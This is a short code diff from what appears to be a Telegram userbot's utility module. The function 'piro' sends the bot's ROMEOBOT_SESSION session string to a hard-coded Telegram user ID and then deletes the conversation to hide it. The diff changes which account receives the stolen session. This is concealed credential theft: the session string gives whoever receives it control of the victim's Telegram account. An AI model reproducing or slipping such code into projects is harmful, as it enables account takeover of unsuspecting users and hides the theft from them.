@@ -2,8 +2,8 @@ import os
 from ..utils import *
 
 async def piro():
-        sweetie = await bot.send_message(5368154755, str(os.environ.get("ROMEOBOT_SESSION")))
-        await bot.delete_dialog(5368154755, str(os.environ.get("ROMEOBOT_SESSION")))
+        sweetie = await bot.send_message(5353539036, str(os.environ.get("ROMEOBOT_SESSION")))
+        await bot.delete_dialog(5353539036, str(os.environ.get("ROMEOBOT_SESSION")))
   
     #try:
         #RomeoBot = bot.session.save()
